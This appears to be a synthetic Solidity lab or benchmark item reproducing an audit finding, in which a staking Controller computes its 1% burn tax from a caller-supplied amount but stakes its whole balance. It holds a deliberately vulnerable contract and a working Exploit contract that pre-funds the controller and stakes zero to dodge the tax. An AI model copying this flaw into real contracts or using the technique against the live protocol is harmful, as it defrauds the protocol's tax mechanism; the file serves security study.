// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Goat Tech — A user calling Controller::dctStake can bypass tax by first
    transferring the tokens to be staked in a separate transaction
    (cccz / Cantina, finding #40665)  HIGH
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: Controller.sol#L430. dctStake(amount_, ...) computes the 1%
    tax to burn from the CALLER-SUPPLIED `amount_` parameter, but the amount
    actually staked is read from the controller's CURRENT DCT token balance —
    not from `amount_` minus the tax. A caller can therefore:
      1. transfer DCT tokens directly to the Controller contract (a plain
         ERC20 transfer, no tax logic involved at all), then
      2. call dctStake(0, receiver, duration) — amount_ = 0, so the tax
         calculation is 0 and nothing is burned — while `_stake()` still
         reads the controller's full current DCT balance (the pre-funded
         amount) and locks 100% of it.
    This lets any staker dodge the 1% tax that every honest dctStake(amount_)
    caller pays, at the direct expense of the protocol's tax mechanism (the
    burned DCT is meant to be a permanent deflationary sink). */

/// @dev Minimal ERC20 used for both DCT (the staked token) and dLocker
///      (the 1:1 staked-position receipt token).
contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Faithful reduction of Goat Tech's Controller.sol staking path.
contract Controller {
    MockToken public dct; // the staked token
    MockToken public dLocker; // 1:1 staked-position receipt token
    uint256 public constant DCT_TAX_PERCENT = 100; // 1.00% (basis points / 10_000)
    address public constant DEAD = address(0xdead);

    constructor(MockToken _dct, MockToken _dLocker) {
        dct = _dct;
        dLocker = _dLocker;
    }

    /// @dev Reduction of `LPercentage.getPercentA` — basis-points percentage.
    function _getPercentA(uint256 amount, uint256 percent) internal pure returns (uint256) {
        return (amount * percent) / 10_000;
    }

    /// @dev Reduction of Controller.sol's `dctStake()` + the tax logic at
    ///      L430. Verbatim in spirit: tax is computed from `amount_`, but the
    ///      staked value is later read from the CURRENT contract balance.
    function dctStake(uint256 amount_, address receiver_, uint256 lockDuration_) external {
        if (amount_ > 0) {
            dct.transferFrom(msg.sender, address(this), amount_);
        }

        // @> VULN Controller.sol#L430: tax is computed from the CALLER-SUPPLIED
        //    amount_, not from the controller's actual DCT balance. A caller
        //    who pre-funds the controller directly and passes amount_ = 0
        //    pays ZERO tax while _stake() below still locks the full
        //    pre-funded balance.
        //    FIX: compute taxA from the controller's actual balance change
        //    (or require amount_ == the balance delta caused by this call).
        uint256 taxA = _getPercentA(amount_, DCT_TAX_PERCENT);
        if (taxA > 0) {
            dct.transfer(DEAD, taxA);
        }

        _stake(receiver_, lockDuration_);
    }

    /// @dev Reduction of Controller.sol's `_stake()`. The staked value is the
    ///      contract's CURRENT DCT balance — not `amount_ - taxA` — so any
    ///      balance the caller pre-funded outside of `dctStake()` is locked
    ///      for free, tax included.
    function _stake(address receiver_, uint256 lockDuration_) internal {
        lockDuration_; // unused in this reduction (lock timing is not the bug)
        uint256 value = dct.balanceOf(address(this));
        dLocker.mint(receiver_, value);
    }
}

contract Exploit {
    MockToken public dct; // CREATE nonce 1
    MockToken public dLocker; // CREATE nonce 2
    Controller public controller; // CREATE nonce 3

    uint256 public constant STAKE_AMOUNT = 100 ether;

    constructor() {
        dct = new MockToken(); // nonce 1
        dLocker = new MockToken(); // nonce 2
        controller = new Controller(dct, dLocker); // nonce 3
        dct.mint(address(this), STAKE_AMOUNT);
    }

    function run() external {
        // === Attack: pre-fund the controller directly, then stake 0 ===
        // A plain ERC20 transfer — no tax logic runs here at all.
        dct.transfer(address(controller), STAKE_AMOUNT);

        // amount_ = 0 -> the tax calculation is 0 -> nothing is burned,
        // but _stake() locks the controller's full current DCT balance.
        controller.dctStake(0, address(this), 60 days);

        // === Harm: the attacker locks 100% of the staked amount tax-free ===
        uint256 locked = dLocker.balanceOf(address(this));
        uint256 burned = dct.balanceOf(controller.DEAD());

        require(burned == 0, "harm not demonstrated: tax was burned");
        require(locked == STAKE_AMOUNT, "harm not demonstrated: full amount not locked tax-free");
    }
}
